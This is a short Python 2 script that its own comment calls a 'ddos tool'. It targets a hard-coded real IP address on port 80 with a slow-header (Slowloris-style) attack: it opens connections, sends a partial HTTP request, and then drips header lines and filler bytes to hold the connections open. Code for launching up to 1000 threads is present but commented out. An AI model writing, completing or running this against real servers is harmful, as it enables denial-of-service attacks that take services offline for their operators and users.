#!/usr/bin/env python
import socket
import time
import threading
import thread
#Pressure Test,ddos tool
#---------------------------
MAX_CONN=10
PORT=80
HOST="121.52.209.23"
PAGE="/"
MAX=1000
#---------------------------

buf=("GET %s HTTP/1.1\r\n"
    "Host: %s\r\n"
    % (PAGE,HOST))

data = range(0,10)
data[0]=("User-Agent: Mozilla/4.0\r\n")
data[1]=("Cookie:lalala\r\n")
data[2]=("Cookie:lalala\r\n")
data[3]=("Cookie:lalala\r\n")
data[4]=("Cookie:lalala\r\n")
data[5]=("Cookie:lalala\r\n")
data[6]=("Cookie:lalala\r\n")
data[7]=("Cookie:lalala\r\n")
data[8]=("Cookie:lalala\r\n")
data[9]=("Cookie:lalala\r\n\r\n")
def conn_thread():
        i = 0
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
	    s.connect((HOST,PORT))
            s.send(buf)

            while i<10:
                    s.send(data[i])
                    print data[i]
                    i = i+1
                    time.sleep(1)
        except Exception,ex:
	    print "Could not connect to server or send error:%s"%ex

#every session fill the data with string "fa"
def send_thread():  
	global socks
	print len(socks)
	j=0
	while True:
		for s in socks:
			try:
				s.send("fa")
				print "send socks OK\n!"
				print "s=%s\n"%s
			#	print s.recv(1024)
			#	s.close()
			except Exception,ex:
				print "Send Exception:%s\n"%ex
				socks.remove(s)
				s.close()
		j=j+1
		print j
			#time.sleep(1)
#end def
def main():
#    conn_th=threading.Thread(target=conn_thread,args=())
#    send_th=threading.Thread(target=send_thread,args=())
#    thread.start_new_thread(conn_thread,())
#    thread.start_new_thread(send_thread,())
#    threads = []
#    for i in range(0,MAX):
#        t = threading.Thread(target=conn_thread,args=())
#        threads.append(t)
    print "already"
    conn_thread()
#    for i in range(0,MAX):
#        threads[i].start()
#        threads[i].join()
#    print "already start"
#    for i in range(0,MAX):
#        threads[i].join()# join means wait until the child thread run over ,then the main thread start continue run
    
    print 'all done'
#    conn_thread()
#    send_thread()
    print "lyue"
    return
main()

